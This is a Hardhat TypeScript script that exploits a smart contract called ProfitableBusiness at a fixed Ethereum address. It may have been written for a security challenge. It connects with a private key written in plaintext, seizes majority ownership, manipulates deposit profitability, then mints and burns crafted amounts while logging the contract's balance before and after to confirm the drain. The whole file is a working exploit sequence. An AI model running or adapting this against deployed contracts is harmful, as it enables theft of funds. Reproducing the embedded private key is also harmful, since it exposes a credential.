import { ethers } from 'hardhat'
import { BigNumber } from 'ethers'
import { Bank2__factory, Attack__factory, ProfitableBusiness__factory } from '../typechain'
import { BSC_RPC, ETH_RPC } from '../secrets.config'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'

import * as dotenv from 'dotenv'
dotenv.config()

const mmmAddr = "0x29c779055a7197Ba6eA02756F45658B89Eb5cD14"
const attackAddr = "0x85656ddf9a78d5492e707446C7F1ED07F4bF9c81"

const providerBSC = new ethers.providers.JsonRpcProvider(BSC_RPC)
const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)
const walletPrivateKey = process.env.PRIVATE_TEST

const token = BigNumber.from(10).pow(18)

async function bsc() {}
async function eth() {
  const signer = new ethers.Wallet("1e0d463e0755a9d55c9956d26f991f067bebb7aa92c11c784bb9c3ccb1ad91bc", providerETH);
  const mmmContract = ProfitableBusiness__factory.connect(mmmAddr, signer)
  console.log(await providerETH.getBalance(mmmAddr));
  await (await mmmContract.changeMajorityOwner()).wait()
  await (await mmmContract.enhanceDepositProfitability(BigNumber.from(10).pow(18), 1)).wait()
  await (await mmmContract.mint({value: 1})).wait()
  await (await mmmContract.burn(BigNumber.from(10).pow(8).add(BigNumber.from(10).pow(15)).add(1))).wait()
  console.log(await providerETH.getBalance(mmmAddr));
}

eth()
// bsc()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
